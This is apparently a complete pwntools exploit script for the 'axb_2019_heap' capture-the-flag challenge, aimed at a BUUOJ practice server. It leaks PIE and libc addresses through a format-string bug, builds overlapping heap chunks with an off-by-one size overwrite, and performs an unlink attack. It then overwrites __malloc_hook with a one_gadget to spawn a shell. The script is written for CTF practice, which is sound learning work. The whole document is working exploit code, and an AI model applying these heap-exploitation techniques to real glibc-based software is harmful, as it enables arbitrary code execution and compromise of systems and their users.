from pwn import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./axb_2019_heap')
libc = ELF('./libc-2.23_x64_1604.so')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def add(index,size,cont):
	sh.sendlineafter('>> ','1')
	sh.sendlineafter('(0-10):',str(index))
	sh.sendline(str(size))
	sh.sendline(str(cont))

def delete(index):
	sh.sendlineafter('>> ','2')
	sh.sendlineafter('index:\n',str(index))

def edit(index,cont):
	sh.sendlineafter('>> ','4')
	sh.sendlineafter('index:\n',str(index))
	sh.send(str(cont))

def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))

sh = process('./axb_2019_heap')
sh = remote('node3.buuoj.cn',25304)
fmt = 'B' + '%11$p.'+'%15$p'
sh.sendlineafter('Enter your name: ',fmt)
sh.recvuntil('B')

file_addr = int(sh.recvuntil('.',drop=1),16) - 0x1186
libc_addr = int(sh.recvuntil('\n',drop=1),16) - 240 - libc.sym['__libc_start_main']
bss_key = file_addr + 0x202040
bss_note = file_addr + 0x202060
atoi_got = file_addr + 0x201fa0
system_addr = libc_addr+libc.sym['system']
malloc_hook = libc_addr + libc.sym['__malloc_hook']
onegad = [0x45216,0x4526a,0xf02a4,0xf1147]
onegadget = libc_addr+onegad[3]
show_addr('libc_addr',libc_addr)
show_addr('file_addr',file_addr)
show_addr('onegadget',onegadget)
show_addr('malloc_hook',malloc_hook)
show_addr('bss_key',bss_key)
show_addr('bss_note',bss_note)
show_addr('atoi_got',atoi_got)

#small bin extending
add(0,0x88,'A'*8)
add(1,0x88,'B'*8)
add(2,0x88,'C'*0x20 + p64(0) + p64(0x21) + 'A'*0x10 + p64(0) + p64(0x21))
add(3,0x88,'A'*8)
edit(0,'A'*0x88 + '\xc1')
#gdb.attach(sh)
delete(1)
add(1,0xb0,'B'*8)

#unlink attack
fd = file_addr + 0x202080-0x18
bk = file_addr + 0x202080-0x10
edit(2,p64(0)+p64(0x81)+p64(fd)+p64(bk)+'A'*0x60+p64(0x80)+'\x90')
#gdb.attach(sh,'b*_int_free')
delete(3)
#gdb.attach(sh)

#attack
attack = p64(0x88) + p64(malloc_hook) + p64(0xb0) + '\n' 
edit(2,attack)
#gdb.attach(sh)
edit(1,p64(onegadget)+'\n')
#gdb.attach(sh)
sh.sendlineafter('>> ','1')
sh.sendlineafter('(0-10):','7')
sh.sendline('129')

sh.interactive()
